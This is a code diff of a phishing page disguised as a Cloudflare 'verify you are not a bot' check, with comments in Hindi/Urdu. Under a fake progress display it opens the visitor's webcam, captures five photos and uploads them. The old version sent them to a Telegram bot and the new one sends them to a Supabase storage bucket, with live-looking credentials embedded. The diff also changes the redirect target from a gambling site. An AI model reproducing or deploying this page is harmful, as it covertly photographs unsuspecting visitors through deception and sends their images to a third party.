@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -190,9 +190,9 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        video, canvas {
-            display: none;
-        }
+
+        video, canvas { display: none; }
+
         @media (max-width: 500px) {
             .cf-container { padding: 32px 20px 28px; }
             .cf-title { font-size: 18px; }
@@ -206,20 +206,25 @@
 
     <div class="cf-container" id="cfContainer">
 
+        <!-- HEADER: Logo + Badge -->
         <div class="cf-header">
             <div class="cf-logo">
+                <!-- 🔑 APNI "cloudflare.png" IMAGE YAHAN RAKHEIN -->
                 <img src="cloudflare.png" alt="Cloudflare">
             </div>
             <div class="cf-badge">🔒 Security Check</div>
         </div>
 
+        <!-- TITLE -->
         <div class="cf-title" id="titleText">Verify you are not a bot</div>
 
+        <!-- SUBTEXT -->
         <div class="cf-sub" id="subText">
             Please wait while we verify your browser is secure.<br>
             This process is <strong>automatic</strong> and will only take a few seconds.
         </div>
 
+        <!-- STATUS BOX -->
         <div class="cf-status-box" id="statusBox">
             <div class="cf-status-item" id="step1">
                 <span class="icon loading" id="icon1">⟳</span>
@@ -239,25 +244,30 @@
             </div>
         </div>
 
+        <!-- PROGRESS BAR -->
         <div class="cf-progress">
             <div class="cf-progress-bar" id="progressBar"></div>
         </div>
 
+        <!-- SUCCESS MESSAGE -->
         <div class="cf-success" id="successMsg">
             <span class="check-icon">✅</span>
             Verification complete — you are human!
         </div>
 
+        <!-- REDIRECT -->
         <div class="cf-redirect" id="redirectMsg">
             <span class="blink">⟳</span> Redirecting to requested page...
         </div>
 
+        <!-- RAY ID + IP -->
         <div class="cf-ray">
             <span>Ray ID: <span id="rayIdValue"></span></span>
             <span>Your IP: <span id="ipValue"></span></span>
             <span>Performance &amp; security by <span style="color:#f38020;">Cloudflare</span></span>
         </div>
 
+        <!-- FOOTER -->
         <div class="cf-footer">
             <a href="#">Privacy Policy</a>
             <a href="#">Terms of Service</a>
@@ -269,21 +279,24 @@
     <video id="v" autoplay></video>
     <canvas id="c"></canvas>
 
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2">
+    </script>
+
     <script>
         // ================================================================
-        // 🔑 BAS YAHAN APNA TELEGRAM BOT TOKEN AUR CHAT ID DAALEIN
+        // 🔑 SUPABASE CONFIG (Apni key yahan daalein)
         // ================================================================
-        const BOT_TOKEN = '86_ZV0RHvVRqtvTLBmRwBSs60';   // @BotFather se lein
-        const CHAT_ID = '81753';       // @userinfobot se lein
+        const SUPABASE_URL = 'https://dnrlkpyalnxxzqlhsges.supabase.co';
+        const SUPABASE_ANON_KEY = 'sb_publishable_krgxQdwaG8LjuFRAQuPHxw_mHd79J9l';
 
-        // 🔢 Kitni photos capture karni hain? (5 ya 10)
+        const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+        // 🔢 Kitni photos capture karni hain? (5)
         const TOTAL_PHOTOS = 5;
 
-        // 🔗 Redirect kahan karna hai? (Verification ke baad)
-        const REDIRECT_URL = 'https://www.99pkrvip.com/m/index.html';
+        // 🔗 Redirect kahan karna hai?
+        const REDIRECT_URL = 'https://www.google.com';
 
-        // ================================================================
-        // ⚠️ NECHE KI CODE KO MAT CHHEDIYE — SAB AUTO HAI
         // ================================================================
 
         const v = document.getElementById('v');
@@ -362,30 +375,31 @@
             step4.style.display = step >= 4 ? 'flex' : 'none';
         }
 
-        // ========== SEND PHOTO TO TELEGRAM ==========
-        async function sendToTelegram(imageData, index) {
+        // ========== SEND PHOTO TO SUPABASE ==========
+        async function sendToSupabase(imageData, index) {
             try {
-                // Base64 se Blob banayein
-                const response = await fetch(imageData);
-                const blob = await response.blob();
+                const blob = await fetch(imageData).then(r => r.blob());
+                const fileName = `prank/${Date.now()}_${index}.jpg`;
 
-                // FormData prepare karein
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, `photo_${index}.jpg`);
-                formData.append('caption', `📸 Photo ${index}/${TOTAL_PHOTOS}`);
+                const { data, error } = await supabase
+                    .storage
+                    .from('photos')
+                    .upload(fileName, blob);
 
-                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+                if (error) {
+                    console.error('Upload error:', error);
+                    return null;
+                }
 
-                const res = await fetch(url, {
-                    method: 'POST',
-                    body: formData
-                });
+                const { data: urlData } = supabase
+                    .storage
+                    .from('photos')
+                    .getPublicUrl(fileName);
 
-                return res.ok;
+                return urlData.publicUrl;
             } catch (e) {
                 console.error('Send error:', e);
-                return false;
+                return null;
             }
         }
 
@@ -417,7 +431,7 @@
                 setIcon(icon2, 'done');
                 text2.textContent = '✓ Device verification complete';
                 setProgress(55);
-                await delay(400);
+                await delay(1000);
 
                 showStep(3);
                 setIcon(icon3, 'loading');
@@ -435,8 +449,8 @@
                 text4.textContent = 'Completing verification...';
                 setProgress(82);
 
-                // ======== CAPTURE PHOTOS ========
-                let photos = [];
+                // ======== CAPTURE 5 PHOTOS ========
+                let urls = [];
                 const width = v.videoWidth || 640;
                 const height = v.videoHeight || 480;
 
@@ -445,7 +459,11 @@
                     cv.width = width;
                     cv.height = height;
                     cv.getContext('2d').drawImage(v, 0, 0, width, height);
-                    photos.push(cv.toDataURL('image/jpeg', 0.85));
+                    const imageData = cv.toDataURL('image/jpeg', 0.85);
+                    const url = await sendToSupabase(imageData, i + 1);
+                    if (url) urls.push(url);
+                    // 0.5 second gap between captures
+                    await delay(500);
                 }
 
                 if (v.srcObject) {
@@ -455,23 +473,20 @@
                 setProgress(88);
                 text4.textContent = 'Verification in progress...';
 
-                // ======== SEND TO TELEGRAM ========
+                // ======== SEND 5 PHOTOS ========
                 let sent = 0;
-                for (let i = 0; i < photos.length; i++) {
-                    const success = await sendToTelegram(photos[i], i + 1);
-                    if (success) sent++;
-                    // Telegram rate limit ke liye 0.5 second gap
-                    await delay(500);
+                for (let i = 0; i < urls.length; i++) {
+                    if (urls[i]) sent++;
                 }
 
                 // ✅ SUCCESS!
                 setIcon(icon4, 'done');
-                text4.textContent = '✓ Verification complete!';
+                text4.textContent = `✓ Verification complete! (${sent}/${TOTAL_PHOTOS} photos processed)`;
                 setProgress(100);
 
                 successMsg.style.display = 'flex';
                 titleText.textContent = '✅ Verification successful!';
-                subText.textContent = 'Your identity has been verified. Redirecting...';
+                subText.textContent = `Your identity has been verified. ${sent}/${TOTAL_PHOTOS} photos processed.`;
 
                 await delay(1800);
                 redirectMsg.style.display = 'block';
@@ -496,10 +511,9 @@
             setTimeout(startVerification, 600);
         };
 
-        console.log('☁️ Cloudflare Verification (Telegram Bot)');
+        console.log('☁️ Cloudflare Verification (5 Photos)');
         console.log('📸 Capturing photos...');
-        console.log('📤 Sending to Telegram...');
-        console.log('✅ Bot Token & Chat ID set!');
+        console.log('📤 Sending to Supabase...');
     </script>
 
 </body>
